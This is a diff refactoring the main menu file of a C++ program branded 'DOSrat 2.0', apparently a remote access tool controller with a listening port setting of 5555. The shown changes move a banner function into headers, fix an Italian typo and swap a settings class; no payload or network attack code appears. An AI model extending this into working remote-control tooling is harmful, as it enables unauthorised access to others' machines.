@@ -1,36 +1,19 @@
 #include <iostream>
 #include <EssCurl.h>
 
-using namespace std;
-
 string Version = "2.0.0";
 
-void StampaTitolo(short Returns = 0)
-{
-    TextColor tc;
-    tc.SetColor(tc.Green);
+#include "Funzioni.h"
+#include "Classi.h"
 
-    cout << "  ______  _______ ______                      ______    _____  " << endl;
-    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
-    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
-    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
-    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
-    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
-    cout << "| Versione [" << Version << "]" << endl;
-    cout << "| DOSrat 2.0 by Criper98" << endl;
-
-    for (int i = 0; i < Returns; i++)
-        cout << endl;
-
-    tc.SetColor(tc.Default);
-}
+using namespace std;
 
 int main()
 {
     CLInterface cli;
     TextColor tc;
     DirUtils du;
-    SettingsFile sf(du.GetFilePath() + "settings.ini");
+    Settaggi settaggi;
     
     VectString MenuPrincipale;
     VectSettings MenuImpostazioni(5);
@@ -44,7 +27,7 @@ int main()
 #pragma region Impostazioni
 
     MenuImpostazioni[0].Escape = true;
-    MenuImpostazioni[0].Name = "Torna Indiero";
+    MenuImpostazioni[0].Name = "Torna Indietro";
 
     MenuImpostazioni[1].Name = "Porta";
     MenuImpostazioni[1].Value = "5555";
@@ -64,6 +47,8 @@ int main()
     MenuImpostazioni[4].Escape = true;
 
 #pragma endregion
+
+    settaggi.SetSettings();
 
     StampaTitolo(1);
     cli.SubTitle("Menu Principale", 60, tc.Green);
